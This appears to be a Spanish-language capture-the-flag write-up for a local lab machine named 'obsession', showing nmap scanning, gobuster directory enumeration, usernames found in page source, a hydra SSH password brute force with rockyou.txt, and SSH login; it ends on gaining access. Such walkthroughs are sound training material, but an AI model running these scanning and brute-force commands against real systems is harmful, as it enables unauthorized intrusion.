DESPLIEGUE

```
bash auto_deploy.sh obsession.tar
```


------------------------
PROCEDIMIENTO:

Tenemos la IP: 
```
172.17.0.2
```

---------------------------

RECONOCIMIENTO

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.17.0.2
```


![[Pasted image 20240915192902.png]]

Tenemos el puerto 22, 80 y 21.

Miramos primero la página web:

![[Pasted image 20240915193018.png]]



A simple vista parece que no hay nada pero nos metemos en el código y...

![[Pasted image 20240915193106.png]]

juan y camilo, dos usuarios. 

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```



![[Pasted image 20240915193334.png]]


![[Pasted image 20240915193641.png]]

`russoski`, tenemos a un usuario ahora podremos hacer un hydra para buscar algún tipo de contraseña. 

```
hydra -l russoski -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

![[Pasted image 20240915193920.png]]

Y ya tenemos contraseña por que nos podemos conectar por el puerto 22.

```
ssh russoski@172.17.0.2
```


No sale este error, podemos sulicionarlo conlo siguiente:

![[Pasted image 20240915194053.png]]


```
ssh-keygen -R 172.17.0.2
```

![[Pasted image 20240915194219.png]]

Y volvemos a meter :
```
ssh russoski@172.17.0.2
```

![[Pasted image 20240915194912.png]]

Ya estamos adentro. 
